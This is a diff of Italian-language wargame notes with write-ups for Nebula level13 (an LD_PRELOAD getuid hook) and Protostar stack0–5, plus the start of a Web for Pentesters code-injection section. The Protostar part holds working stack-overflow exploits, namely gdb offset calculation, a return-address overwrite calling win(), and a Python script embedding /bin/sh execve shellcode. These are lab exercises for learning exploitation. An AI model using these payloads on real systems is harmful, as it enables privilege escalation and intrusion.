@@ -295,7 +295,8 @@ tail -f /tmp/server.txt | grep -v '.oO Oo.'
 In questo terminael troveremo la password di flag10, basterà poi fare `su flag10` > inserire la password ottenuta > eseguire getflag con tale account.  
 
 
-## Level13:
+
+## Level13
 
 Nella home directory di flag13 è presente un binario che controlla lo userID dell'utente che lancia il processo, se corrisponde al valore predeterminato allora si stampa il token - password di flag13.  
 
@@ -344,24 +345,161 @@ export LD_PRELOAD=./getuid.so ./flag13
 ```
 In questo modo una volta finito l'eseguibile flag13 l'export si perde e torna ad essere normale per evitare di interferire con altri binari.  
 
+<br><br><br>
+
+<center>
+
+# Protostar 
+
+</center>
 
 
-### Protostar 
-- stack 01 
-- stack 03
-- stack 05:  
-    Si consulta il codice sorgente per la challenge e si nota che viene allocato un buffer di 64 caratteri sullo stack e successivamente viene riempito tale buffer con dati letti da terminale, tale input non è controllato (recipe for disaster).  
-    La modalità per affrontare l'esercizio è in #riassunto.md nel heading `Buffer Overflow`.  
-- stack 06:  
+## Stack00
+Abbiamo un buffer e una variabile modified, analizzando il codice sorgente notiamo che per eseguire la challenge con successo basta modificare la variabile, per farlo sfruttiamo il buffer creando un overflow per sovrascrivere la variabile.  
+In quanto il buffer è di dimensione 64, basterà dare in input 65 caratteri per modificare la variabile.    
 
 
-    ```bash
+## Stack04
+Il binario `/opt/protostar/bin/stack4` è un programma che definisce un buffer, viene chiesto il riempimento di tale con la funzione `gets()` e l'obiettivo è invocare una funzione definita ma non chiamata dal main alterando il control flow del programma.  
 
-    ```
+L'exploit richiede di studiare il layout dello stack di questo eseguibile per sfruttare un buffer overflow e invocare la funzione `win()`.  
+Sappiamo che lo stack ha una base puntata da `ebp` e subito dopo esso si trova l'indirizzo di ritorno.  
+Dobbiamo calcolare esattamente quanti byte dobbiamo scrivere per sovrascrivere l'area di memoria fino all'indirizzo di ritorno del main.  
+
+Per fare ciò teniamo a mente la seguente considerazione:
+- la base dello stack si trova in `ebp` e l'indirizzo di ritorno insieme ai parametri della funzione vengono salvati negli indirizzi più alti, ossia verso sinistra (per spostarci su questi indirizzi dobbiamo sommare a `ebp` i byte lungo i quali vogliamo spostarci). Le variabili locali della funzioni si trovano e vengono costruite man mano verso gli indirizzi più bassi, ossia verso sinistra, e per spostarci dovremmo sottrarre a `ebp` il numero di byte per un opportuno offset.  
+- Gli array (come buffer nel nostro caso) vengono quindi allocati verso sinistra ma **crescono** verso destra! Sapendo questo se facciamo un overflow andremo a scrivere le variabili locali che lo precedono e potremmo raggiungere l'indirizzo di ritorno.  
+
+Usiamo il debugger `gdb` per analizzare la srtruttura a run time e trovare gli indirizzi che ci interessano; calcoleremo la distanza di padding come `&return - &buffer` in questo modo sapremo quanti byte ci serviranno per arrivare proprio all'inzio del registro per il return address.  
+Sostituiremo il valore di tale registro con l'indirizzo di `win()` e il payload per fare ciò sarà di questo tipo:  
+`payload= 'a'*(padding)+indirizzo_di_win` 
+
+Gli step da seguire sono i seguenti:  
+
+```bash
+gdb /opt/protostar/bin/stack4
+unset env ROWS && unset env COLUMNS
+
+# otteniamo indirizzo di win 
+p win 
+$1 = {void (void)} 0x80483f4 <win> #[out]: indirizzo di win()
+
+start 
+disas main 
+
+b * 0x08048415
+c
+x/x $eax
+0xbffffca0:	0xb7fd7ff4 # [out]: l'indirizzo è il primo
+
+p $ebp+4-$eax
+$3 = (void *) 0x4c #[out]: ora sappiamo che la distanza è 4c (76) byte
+q
+
+python -c "print 'a'*76+'\xf4\x83\x04\x08'" | /opt/protostar/bin/stack4
+```
+
+
+Quando facciamo `disas main` otteniamo:
+
+```bash
+...
+0x08048411 <main+9>:	lea    0x10(%esp),%eax
+0x08048415 <main+13>:	mov    %eax,(%esp)
+0x08048418 <main+16>:	call   0x804830c <gets@plt>
+...
+```
+
+Da questo codice assembly notiamo (in <main+16>) che viene invocata la funzione `gets()`, sappiamo che gets richiede l'indirizzo del buffer per poter scrivere e notiamo infatti attentamente che in <main+9> abbiamo `lea 0x10(%esp),%eax`, da questa istruzione deduciamo che l'indirizzo del buffer si trovi proprio in `%eax`
+
+**_nota:_** Quando sovrascriviamo l'indirizzo di ritorno con quello di `win()` dobbiamo assicurarci di invertire l'indirizzo di quest'ultimo in quanto l'architettura è little endian.   
+
+<br>
+
+## Stack05
+
+Il binario `/opt/protostsar/bin/stack5` prende in ingresso l'input per un buffer da 64 byte, l'esecizio richiede di utilizzare uno shell code ed iniettarlo sul buffer per ottenere i privilegi di root (setuid attivo sul sorgente).  
+
+L'idea è di utilizzare lo shell code ossia codice scritto direttamente sullo stack tramite il buffer, modificare l'indirizzo di ritorno della funzione all'indirizzo del buffer che avrà all'inizio lo shell code, in questo modo verrà eseguito tale codice.  
+
+Per realizzare l'exploit occorre conoscere:
+- L'indirizzo del buffer
+- La posizione del return address della funzione 
+- Shell code da iniettare direttamente sul buffer 
+- Distanza &buffer - &return 
+
+Il payload da dare in pasto all'eseguibile sarà: 
+```
+<shellcode> + <padding> + <indirizzo buffer>
+```
+
+Per ottenere tutte queste informazioni useremo il debugger `gdb`:
+**nota importante** : Risulterà necessario allineare lo stack di gdb con quello della shell eliminando le variaibli di ambiente `LINES` e `COLUMNS`.  
+
+```bash
+gdb /opt/protostar/bin/stack5
+
+unset env LINES
+unset env COLUMNS
+
+start 
+p $ebp+4 # otteniamo & return 
+$1 = (void *) 0xbffffcec
+
+disas main 
+...
+0x080483cd <main+9>:	lea    0x10(%esp),%eax
+0x080483d1 <main+13>:	mov    %eax,(%esp)
+0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
+...
+
+b * 0x080483d1 
+c
+x/x $eax
+0xbffffca0:	0xb7fd7ff4 #otteniamo & buffer
+p $ebp+4-$eax
+$2 = (void *) 0x4c #otteniamo distanza $buffer - &return 
+```
+
+A questo punto sappiamo che la distanza tra buffer e indirizzo di ritorno è di `0x4c` ossia 76 byte, e conosciamo anche l'indirizzo del buffer ossia `0xbffffca0`.  
+
+Consultiamo lo script python che contiene lo shell code:
+
+```python
+length = 76 # lunghezza aggiornata 
+ret = '\xa0\xfc\xff\xbf' # indirizzo in little endian del buffer
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
+            "\x68\x68\x2f\x62\x69\x6e\x89" + \
+            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
+            "\xcd\x80\x31\xc0\x40\xcd\x80" 
+padding = 'a' * (length - len(shellcode))
+
+payload = shellcode + padding + ret
+print(payload)
+```
+
+A questo punto non ci resta che invocare il binario per provoare lo shell code.  
+**Nota:** Bisogna invocare il binario sfruttando `cat`, altrimenti la shell aprta riceve un EOF dallo stdin svuotato da `gets()` che chiuderebbe la shell. 
+- il primo cat inietta l'input malevolo ed attiva la shell 
+- il secondo accetta input da STDIN e lo inoltra alla shell
 
 
 
-### Web4PenTesters
+## Stack05
+
+
+
+
+
+<center>
+
+# Web4PenTesters
+
+</center>
+
+
+
+
 - Code Injection 1:
     Si guarda il codice sorgente in `/var/www/codeexec` e si nota che viene usata una stringa $str = 'echo...' e che tale stringa viene interpretata come una espressione php.  
     Si usa lo schema di attacco generico: 
